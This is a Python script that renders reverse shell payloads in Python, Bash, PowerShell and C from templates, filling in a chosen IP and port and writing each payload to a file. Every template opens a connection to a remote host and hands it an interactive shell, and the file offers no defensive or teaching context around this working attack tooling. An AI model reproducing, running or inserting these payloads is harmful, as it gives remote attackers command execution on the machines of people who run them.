import os
from jinja2 import Template

PYTHON_REV_TEMPLATE = '''
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{{ ip }}",{{ port }}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty; pty.spawn("/bin/bash")
'''

BASH_REV_TEMPLATE = '''#!/bin/bash
bash -i >& /dev/tcp/{{ ip }}/{{ port }} 0>&1
'''

POWERSHELL_REV_TEMPLATE = '''
$client = New-Object System.Net.Sockets.TCPClient("{{ ip }}",{{ port }})
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
'''

C_REV_TEMPLATE = '''
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int sockfd;
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons({{ port }});
    addr.sin_addr.s_addr = inet_addr("{{ ip }}");
    
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));
    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);
    execve("/bin/bash", NULL, NULL);
    return 0;
}
'''

def generate_payload(lang, ip, port, output):
    templates = {
        'python': PYTHON_REV_TEMPLATE,
        'bash': BASH_REV_TEMPLATE,
        'powershell': POWERSHELL_REV_TEMPLATE,
        'c': C_REV_TEMPLATE
    }
    
    if lang in templates:
        template = Template(templates[lang])
        payload = template.render(ip=ip, port=port)
        with open(output, 'w') as f:
            f.write(payload)
        print(f"[+] {lang.capitalize()} reverse shell written to {output}")
    else:
        print(f"[!] Language '{lang}' not supported. Available: {', '.join(templates.keys())}") 